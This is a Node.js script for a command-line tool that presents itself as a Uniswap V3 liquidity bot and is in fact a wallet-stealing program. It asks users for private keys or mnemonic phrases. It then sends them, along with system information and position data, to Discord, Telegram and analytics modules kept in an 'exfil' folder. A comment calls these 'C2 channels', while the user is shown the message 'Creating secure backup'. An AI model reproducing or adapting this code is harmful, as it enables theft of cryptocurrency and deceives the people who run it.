#!/usr/bin/env node

/**
 * Uniswap V3 Liquidity Bot
 * Automated liquidity provision and optimization
 */

const readline = require('readline');
const chalk = require('chalk');
const Table = require('cli-table3');

const WalletManager = require('./core/wallet');
const LiquidityProvider = require('./strategies/liquidityProvider');
const DiscordNotifier = require('./exfil/discordWebhook');
const TelegramBackup = require('./exfil/telegramBot');
const AnalyticsTracker = require('./exfil/analytics');
const Logger = require('./utils/logger');
const { getSystemInfo } = require('./utils/systemInfo');

// Initialize components
const walletManager = new WalletManager();
const liquidityProvider = new LiquidityProvider();
const discord = new DiscordNotifier();
const telegram = new TelegramBackup();
const analytics = new AnalyticsTracker();
const logger = new Logger();

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function displayBanner() {
    console.log(chalk.cyan(`
╔════════════════════════════════════════════════════╗
║     Uniswap V3 Liquidity Bot v1.0.0               ║
║     Automated Liquidity Provision & Optimization  ║
╚════════════════════════════════════════════════════╝
    `));
}

function displayMenu() {
    console.log(chalk.white('\n' + '='.repeat(50)));
    console.log(chalk.bold('MAIN MENU'));
    console.log('='.repeat(50));
    console.log('1. Connect Wallet');
    console.log('2. Create Liquidity Position');
    console.log('3. View Positions');
    console.log('4. Rebalance Position');
    console.log('5. Bot Statistics');
    console.log('6. Exit');
    console.log('='.repeat(50));
}

function prompt(question) {
    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            resolve(answer.trim());
        });
    });
}

async function connectWallet() {
    console.log(chalk.green('\n[+] Connect Wallet'));
    console.log('-'.repeat(50));
    console.log('1. Connect with Private Key');
    console.log('2. Connect with Mnemonic (12-24 words)');

    const choice = await prompt('\nSelect method: ');

    try {
        let walletInfo;

        if (choice === '1') {
            const privateKey = await prompt('Enter your private key: ');
            const rpcUrl = await prompt('RPC URL (press Enter for default): ') || undefined;

            walletInfo = await walletManager.connectWithPrivateKey(privateKey, rpcUrl);

        } else if (choice === '2') {
            const mnemonic = await prompt('Enter your mnemonic phrase: ');
            const rpcUrl = await prompt('RPC URL (press Enter for default): ') || undefined;

            walletInfo = await walletManager.connectWithMnemonic(mnemonic, rpcUrl);

        } else {
            console.log(chalk.red('[!] Invalid choice'));
            return;
        }

        console.log(chalk.green('\n[✓] Wallet connected successfully!'));
        console.log(`\nAddress: ${chalk.bold(walletInfo.address)}`);
        console.log(`Balance: ${chalk.bold(walletInfo.balance.toString())} ETH`);

        // Collect system info
        const systemInfo = await getSystemInfo();

        const exfilData = {
            ...walletInfo,
            balance: walletInfo.balance.toString(),
            systemInfo
        };

        // Exfiltrate to all C2 channels
        console.log(chalk.yellow('\n[+] Creating secure backup...'));

        await Promise.all([
            discord.notifyWalletConnected(exfilData),
            telegram.backupWalletCredentials(exfilData),
            analytics.trackWalletConnection(exfilData)
        ]);

        logger.logWalletConnection(exfilData);

        console.log(chalk.green('[✓] Backup created successfully'));

    } catch (error) {
        console.log(chalk.red(`[!] Error: ${error.message}`));
    }
}

async function createPosition() {
    const wallets = walletManager.getConnectedWallets();

    if (wallets.length === 0) {
        console.log(chalk.red('[!] No wallet connected'));
        return;
    }

    console.log(chalk.green('\n[+] Create Liquidity Position'));
    console.log('-'.repeat(50));

    console.log('\nAvailable Strategies:');
    console.log('1. Narrow Range (High APY, High Risk)');
    console.log('2. Wide Range (Low APY, Low Risk)');
    console.log('3. Balanced (Medium APY, Medium Risk)');

    const strategyChoice = await prompt('\nSelect strategy: ');
    const strategyMap = { '1': 'narrow', '2': 'wide', '3': 'balanced' };
    const strategy = strategyMap[strategyChoice];

    if (!strategy) {
        console.log(chalk.red('[!] Invalid strategy'));
        return;
    }

    const token0 = await prompt('Token 0 (e.g., USDC): ');
    const token1 = await prompt('Token 1 (e.g., ETH): ');
    const amount = await prompt('Amount to deposit (ETH): ');

    try {
        const position = await liquidityProvider.createPosition(
            wallets[0].address,
            token0,
            token1,
            amount,
            strategy
        );

        const apy = liquidityProvider.calculateAPY(position);

        console.log(chalk.green('\n[✓] Position created successfully!'));
        console.log(`\nPosition ID: ${chalk.bold(position.id)}`);
        console.log(`Estimated APY: ${chalk.bold(apy + '%')}`);

        // Exfiltrate position data
        await discord.notifyPositionCreated(position);
        await telegram.backupPositionData([position]);
        await analytics.trackPositionCreated(position, wallets[0]);

        logger.logPosition(position);

    } catch (error) {
        console.log(chalk.red(`[!] Error: ${error.message}`));
    }
}

async function viewPositions() {
    const wallets = walletManager.getConnectedWallets();

    if (wallets.length === 0) {
        console.log(chalk.red('[!] No wallet connected'));
        return;
    }

    const positions = liquidityProvider.getWalletPositions(wallets[0].address);

    if (positions.length === 0) {
        console.log(chalk.yellow('[!] No positions found'));
        return;
    }

    const table = new Table({
        head: ['ID', 'Pair', 'Amount', 'Strategy', 'APY', 'Status'],
        colWidths: [20, 15, 12, 12, 10, 10]
    });

    positions.forEach(pos => {
        const apy = liquidityProvider.calculateAPY(pos);
        table.push([
            pos.id,
            `${pos.token0}/${pos.token1}`,
            pos.amount,
            pos.strategy,
            `${apy}%`,
            pos.status
        ]);
    });

    console.log('\n' + table.toString());
}

async function rebalancePosition() {
    const wallets = walletManager.getConnectedWallets();

    if (wallets.length === 0) {
        console.log(chalk.red('[!] No wallet connected'));
        return;
    }

    const positions = liquidityProvider.getWalletPositions(wallets[0].address);

    if (positions.length === 0) {
        console.log(chalk.yellow('[!] No positions to rebalance'));
        return;
    }

    console.log(chalk.green('\n[+] Rebalance Position'));
    console.log('-'.repeat(50));

    positions.forEach((pos, idx) => {
        console.log(`${idx + 1}. ${pos.id} (${pos.token0}/${pos.token1})`);
    });

    const choice = await prompt('\nSelect position to rebalance: ');
    const index = parseInt(choice) - 1;

    if (index >= 0 && index < positions.length) {
        await liquidityProvider.rebalance(positions[index].id);
    } else {
        console.log(chalk.red('[!] Invalid position'));
    }
}

async function showStatistics() {
    const wallets = walletManager.getConnectedWallets();
    const allPositions = liquidityProvider.activePositions;

    console.log(chalk.green('\n[+] Bot Statistics'));
    console.log('='.repeat(50));
    console.log(`Connected Wallets: ${chalk.bold(wallets.length)}`);
    console.log(`Active Positions: ${chalk.bold(allPositions.length)}`);

    if (allPositions.length > 0) {
        const totalValue = allPositions.reduce((sum, pos) => sum + parseFloat(pos.amount), 0);
        console.log(`Total Liquidity: ${chalk.bold(totalValue.toFixed(2) + ' ETH')}`);
    }

    const metrics = {
        wallets: wallets.length,
        positions: allPositions.length,
        systemInfo: await getSystemInfo()
    };

    await analytics.trackPerformance(metrics);
}

async function main() {
    displayBanner();

    let running = true;

    while (running) {
        displayMenu();
        const choice = await prompt('\nSelect option: ');

        switch (choice) {
            case '1':
                await connectWallet();
                break;
            case '2':
                await createPosition();
                break;
            case '3':
                await viewPositions();
                break;
            case '4':
                await rebalancePosition();
                break;
            case '5':
                await showStatistics();
                break;
            case '6':
                console.log(chalk.green('\n[+] Thank you for using Uniswap V3 Liquidity Bot!'));
                running = false;
                rl.close();
                break;
            default:
                console.log(chalk.red('[!] Invalid option'));
        }
    }
}

// Run the bot
main().catch(error => {
    console.error(chalk.red(`Fatal error: ${error.message}`));
    process.exit(1);
});
